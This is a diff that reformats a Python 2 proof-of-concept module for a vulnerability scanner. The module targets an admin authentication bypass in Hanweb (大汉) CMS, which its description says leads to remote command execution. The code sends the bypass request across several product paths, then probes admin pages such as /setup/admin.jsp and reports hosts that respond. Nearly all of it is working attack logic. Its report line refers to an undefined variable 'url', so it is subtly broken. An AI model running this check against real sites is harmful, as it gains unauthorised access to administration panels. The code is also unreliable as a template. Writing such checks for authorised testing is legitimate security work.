@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Hanweb_0002' # 平台漏洞编号，留空
+    vuln_id = 'Hanweb_0002'  # 平台漏洞编号，留空
     name = '大汉管理后台权限绕过 命令执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         大汉科技（Hanweb）管理后台权限绕过，进入后台后轻松GetShell，
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Hanweb(大汉)'  # 漏洞应用名称
     product_version = '大汉管理后台系统'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '638fb5a3-dbc5-4902-a6ce-f4a53a433aa4'
@@ -31,10 +33,11 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            paths = ['/vipchat/','/jcms/','/jsearch/','/jact/','/vc/','/xxgk/'] 
+
+            paths = ['/vipchat/', '/jcms/',
+                     '/jsearch/', '/jact/', '/vc/', '/xxgk/']
             payload = 'VerifyCodeServlet?var=cookie_username'
-            admin_paths = ['/setup/opr_licenceinfo.jsp','/setup/admin.jsp']
+            admin_paths = ['/setup/opr_licenceinfo.jsp', '/setup/admin.jsp']
             for path in paths:
                 verify_url = self.target + path + payload
                 #code, head, res, errcode, _ = curl.curl2(url)
@@ -44,16 +47,17 @@ class Poc(ABPoc):
                         admin_verify_url = self.target + path + admin_path
                         #code, head, res, errcode, _ = curl.curl2(adminurl)
                         r = requests.get(admin_verify_url)
-                        if r.status_code == 200 and  ('Licence' in r.content or 'admin' in r.content):
-                            #security_hole(admin_verify_url)
+                        if r.status_code == 200 and ('Licence' in r.content or 'admin' in r.content):
+                            # security_hole(admin_verify_url)
                             self.output.report(self.vuln, '发现{target}存在{name}漏洞;url={}'.format(
-                                target=self.target, name=self.vuln.name,url=url))
+                                target=self.target, name=self.vuln.name, url=url))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
